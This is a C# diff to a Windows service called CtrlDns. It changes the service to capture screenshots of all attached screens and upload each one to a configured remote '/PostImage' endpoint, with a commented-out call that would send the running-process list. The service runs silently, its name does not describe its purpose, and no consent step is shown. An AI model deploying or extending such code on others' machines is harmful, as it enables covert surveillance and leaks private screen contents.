@@ -2,11 +2,13 @@ using System;
 using System.Collections.Generic;
 using System.Configuration;
 using System.Diagnostics;
+using System.Runtime.InteropServices;
 using System.ServiceProcess;
 using System.Text;
 using System.Timers;
 
 using System.Net.Http;
+using System.Net.Http.Headers;
 using System.Threading.Tasks;
 using System.IO;
 
@@ -17,13 +19,15 @@ using System.Windows.Forms;
 using Newtonsoft.Json;
 
 using CtrlDns.models;
-using System.Security.Policy;
-using static System.Windows.Forms.VisualStyles.VisualStyleElement.TrackBar;
 
 namespace CtrlDns
 {
     public partial class CtrlDns : ServiceBase
     {
+        // P/Invoke for GetDeviceCaps
+        [DllImport("gdi32.dll")]
+        private static extern int GetDeviceCaps(IntPtr hdc, int nIndex);
+
         private static readonly log4net.ILog log = log4net.LogManager.GetLogger(System.Reflection.MethodBase.GetCurrentMethod().DeclaringType);
         private System.Timers.Timer timer = null;
 
@@ -56,10 +60,10 @@ namespace CtrlDns
         {
             CtrlUrl = ConfigurationManager.AppSettings["CtrlUrl"];
 
-            //await PostRunningProcesses(CtrlUrl + "/PostTaskList");
+            // await PostRunningProcesses(CtrlUrl + "/PostTaskList");
             await CaptureScreenshotAsync(string.Empty, CtrlUrl + "/PostImage");
 
-            OnStart(null);
+            //OnStart(null);
         }
 
         protected override void OnStart(string[] args)
@@ -406,27 +410,64 @@ namespace CtrlDns
 
         private async Task CaptureScreenshotAsync(string filePath, string url)
         {
+            int screenID = 0;
             try
             {
-                // Get the bounds of the screen
-                Rectangle bounds = Screen.PrimaryScreen.Bounds;
-
-                // Create a bitmap with the same dimensions
-                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
+                foreach (var screen in Screen.AllScreens)
                 {
-                    // Create a graphics object from the bitmap
-                    using (Graphics graphics = Graphics.FromImage(bitmap))
+                    // Get the bounds of the screen
+                    Rectangle bounds = screen.Bounds;
+
+                    // Use Graphics to get the actual DPI settings
+                    using (Graphics g = Graphics.FromHwnd(IntPtr.Zero))
                     {
-                        // Copy the screen to the bitmap
-                        graphics.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
+                        IntPtr hdc = g.GetHdc();
+                        int dpiX = GetDeviceCaps(hdc, 88); // LOGPIXELSX
+                        int dpiY = GetDeviceCaps(hdc, 90); // LOGPIXELSY
+
+                        //  https://pinvoke.net/default.aspx/gdi32/GetDeviceCaps.html
+                        //  https://stackoverflow.com/questions/5082610/get-and-set-screen-resolution
+                        /// <summary>
+                        /// Vertical height of entire desktop in pixels
+                        /// </summary>
+                        //  DESKTOPVERTRES = 117,
+                        /// <summary>
+                        /// Horizontal width of entire desktop in pixels
+                        /// </summary>
+                        //  DESKTOPHORZRES = 118,
+                        int LogicalScreenHeight = GetDeviceCaps(hdc, 8);
+                        int PhysicalScreenHeight = GetDeviceCaps(hdc, 10);
+                        int DesktopHeight = GetDeviceCaps(hdc, 117);
+                        int DesktopWidth = GetDeviceCaps(hdc, 118);
+
+                        g.ReleaseHdc(hdc);
+
+                        // Calculate the actual bounds without scaling
+                        int width = (int)(bounds.Width * 96 / dpiX);
+                        int height = (int)(bounds.Height * 96 / dpiY);
+
+                        // Create a bitmap with the actual dimensions
+                        using (Bitmap bitmap = new Bitmap(DesktopWidth, DesktopHeight))
+                        {
+                            // Create a graphics object from the bitmap
+                            using (Graphics graphics = Graphics.FromImage(bitmap))
+                            {
+                                // Copy the screen to the bitmap
+                                graphics.CopyFromScreen(bounds.X, bounds.Y, 0, 0, new Size(DesktopWidth, DesktopHeight), CopyPixelOperation.SourceCopy);
+                            }
+
+                            // Post the bitmap to the remote URL
+                            await PostImageAsync(screenID++, bitmap, url);
+
+                            // Save the bitmap to a file
+                            if (!string.IsNullOrWhiteSpace(filePath))
+                            {
+                                // Create a unique file path for each screen
+                                string screenFilePath = Path.Combine(Path.GetDirectoryName(filePath), $"{Path.GetFileNameWithoutExtension(filePath)}_{screen.DeviceName.Replace("\\", "").Replace(".", "")}{Path.GetExtension(filePath)}");
+                                bitmap.Save(screenFilePath, ImageFormat.Png);
+                            }
+                        }
                     }
-
-                    // Post the bitmap to the remote URL
-                    await PostImageAsync(bitmap, url);
-
-                    // Save the bitmap to a file
-                    if (!string.IsNullOrWhiteSpace(filePath))
-                        bitmap.Save(filePath, ImageFormat.Png);
                 }
             }
             catch (Exception ex)
@@ -435,8 +476,12 @@ namespace CtrlDns
             }
         }
 
-        private async Task PostImageAsync(Bitmap bitmap, string url)
+        private async Task PostImageAsync(int screenID, Bitmap bitmap, string url)
         {
+            // Extract the host from the URL
+            Uri uri = new Uri(url);
+            string host = uri.Host;
+
             using (HttpClient client = new HttpClient())
             {
                 using (var content = new MultipartFormDataContent())
@@ -449,8 +494,9 @@ namespace CtrlDns
 
                         // Create the stream content for the multipart form
                         var streamContent = new StreamContent(memoryStream);
-                        streamContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/png");
-                        content.Add(streamContent, "file", "screenshot.png");
+                        streamContent.Headers.ContentType = new MediaTypeHeaderValue("image/png");
+                        content.Add(streamContent, "image", string.Format("screenshot_{0}_{1:MMddHHmm}.png", screenID, DateTime.Now));
+                        client.DefaultRequestHeaders.Host = host;
 
                         // Send the POST request
                         HttpResponseMessage response = await client.PostAsync(url, content);
